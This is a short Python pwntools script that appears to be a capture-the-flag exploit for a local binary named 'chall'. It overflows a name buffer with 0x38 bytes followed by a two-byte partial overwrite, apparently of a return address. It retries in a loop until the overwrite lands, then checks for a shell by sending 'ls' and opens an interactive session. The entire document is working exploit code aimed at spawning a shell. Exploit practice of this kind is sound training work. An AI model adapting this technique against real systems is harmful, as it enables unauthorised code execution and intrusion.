from pwn import *
# context.log_level = "debug"
global p
def pwn():
    name = b'a' * 0x38
    name += b'\x01\x3b'
    io.recvuntil(b'your name?\n')
    io.sendline(name)
    country = b'b' * 0x2
    io.recvuntil(b'live in?')
    io.sendline(country)
    io.recvuntil(b'It was nice meeting you. Goodbye!\n')
    io.sendline("ls")
    tmp = io.recv(1,timeout=1)
    print(tmp)
    if not tmp or tmp==b'*':
        raise
    io.interactive()
    
while 1:
    try:
        io = process("./chall")
        pwn()
    except EOFError:
        io.close()